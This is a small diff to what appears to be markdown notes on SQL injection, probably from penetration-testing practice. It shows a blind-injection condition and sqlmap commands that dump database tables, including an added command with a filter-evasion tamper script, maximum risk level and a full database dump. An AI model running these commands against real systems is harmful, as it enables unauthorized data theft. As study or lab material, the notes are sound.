@@ -68,7 +68,9 @@ substring((select version()), 1,1) = '7'#
 sqlmap -r req2.txt --level=2 --dump -T injection0x02
 ```
 
-
+```
+sqlmap -r colleagues.req --tamper=charunicodeescape --delay 3 --level 5 --risk 3 --dbms=mssql -technique=U --batch --dump-all --exclude-sysdbs -v 3
+```
 
 <hr>
 
